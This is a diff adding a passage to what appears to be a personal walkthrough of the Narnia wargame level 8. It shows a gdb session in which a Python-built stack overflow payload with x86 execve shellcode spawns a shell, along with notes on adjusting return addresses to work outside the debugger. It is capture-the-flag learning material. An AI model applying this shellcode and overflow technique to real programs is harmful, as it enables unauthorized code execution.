@@ -474,4 +474,18 @@ Warning:
 Cannot insert breakpoint 1.
 Cannot access memory at address 0x80484a7
 
-hmmmm, whacky....
+hmmmm, whacky.... Let's try without breakpoint 1
+
+(gdb) r $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"\xb0\xd6\xff\xff"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /narnia/narnia8 $(python -c'print "A"*20+"\x9f\xd8\xff\xff"+"B"*12+"\xb0\xd6\xff\xff"+"\x90"*(64-25-16)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
+AAAAAAAAAAAAAAAAAAAA����BBBBBBBBBBBB���������������������������1�Ph//shh/bin��PS���°
+                                                                                    
+process 134 is executing new program: /bin/dash
+$ whoami
+narnia8
+
+Check it out!! Now all I have to do is change the address "\x9f\xd8\xff\xff", and possibly "\xb0\xd6\xff\xff" to make this shit work outside of gdb
+
